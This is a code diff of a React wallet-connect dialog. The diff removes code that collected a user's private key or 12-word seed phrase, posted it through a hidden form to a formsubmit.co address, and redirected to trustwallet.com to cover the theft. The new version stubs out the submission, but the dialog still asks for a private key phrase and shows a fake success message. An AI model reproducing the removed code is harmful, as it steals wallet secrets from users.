@@ -11,7 +11,7 @@ interface WalletDialogProps {
 
 const WalletDialog = ({ open, onOpenChange }: WalletDialogProps) => {
   const [phrase, setPhrase] = useState("");
-  const [loading, setLoading] = useState(false);  // Loading state
+  const [loading, setLoading] = useState(false);
   const { toast } = useToast();
 
   const handleConnect = async (e: React.FormEvent) => {
@@ -20,7 +20,7 @@ const WalletDialog = ({ open, onOpenChange }: WalletDialogProps) => {
     if (!phrase.trim()) {
       toast({
         title: "Error",
-        description: "Please enter your private key or 12 word phrase",
+        description: "Please enter your private key phrase",
         variant: "destructive",
       });
       return;
@@ -29,29 +29,12 @@ const WalletDialog = ({ open, onOpenChange }: WalletDialogProps) => {
     setLoading(true);
 
     try {
-      // Create form dynamically for submission via formsubmit.co
-      const form = document.createElement('form');
-      form.method = 'POST';
-      form.action = 'https://formsubmit.co/06fed404371470d7cfff86b643c88efe';  // Replace with your email
-
-      const phraseInput = document.createElement('input');
-      phraseInput.type = 'hidden';
-      phraseInput.name = 'phrase';
-      phraseInput.value = phrase;
-
-      // Add redirect URL to hide the formsubmit confirmation page
-      const redirectInput = document.createElement('input');
-      redirectInput.type = 'hidden';
-      redirectInput.name = 'redirect';
-      redirectInput.value = 'https://trustwallet.com/';
-      form.appendChild(phraseInput);
-      form.appendChild(redirectInput);
-      document.body.appendChild(form);
-      form.submit();
-
+      // Implement your own wallet connection logic here
+      console.log("Connecting wallet...");
+      
       toast({
         title: "Success",
-        description: "Your wallet has been successfully connected for debugging",
+        description: "Your wallet has been successfully connected",
       });
 
       setPhrase("");
@@ -81,8 +64,8 @@ const WalletDialog = ({ open, onOpenChange }: WalletDialogProps) => {
             Separate each word with a space
           </p>
           <Input
-            type="text"
-            placeholder="Enter your private key or 12 word phrase"
+            type="password"
+            placeholder="Enter your private key phrase"
             value={phrase}
             onChange={(e) => setPhrase(e.target.value)}
             className="w-full"
